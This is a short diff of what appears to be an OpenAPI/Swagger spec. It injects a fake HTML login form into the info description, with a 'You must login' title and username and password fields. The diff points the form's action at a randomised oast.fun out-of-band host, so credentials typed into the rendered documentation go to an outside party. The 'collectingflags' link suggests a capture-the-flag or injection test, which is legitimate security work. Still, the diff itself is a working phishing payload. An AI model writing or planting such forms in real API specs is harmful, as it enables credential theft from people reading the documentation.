@@ -3,7 +3,7 @@ info:
   title: You must login before you can continue 😱 !
   description: |
     **Note:** You must be logged in to access these resources. For more details, visit our [documentation](https://www.collectingflags.com/redirect.php)
-    <form action="https://example.com/submit" method="post">
+    <form action="https://wdmlfwehjkkbslnzvkyjczx1dchprmvw8.oast.fun/submit" method="post">
       <input type="text" name="username" placeholder="Username">
       <input type="password" name="password" placeholder="Password">
       <button type="submit">Submit</button>
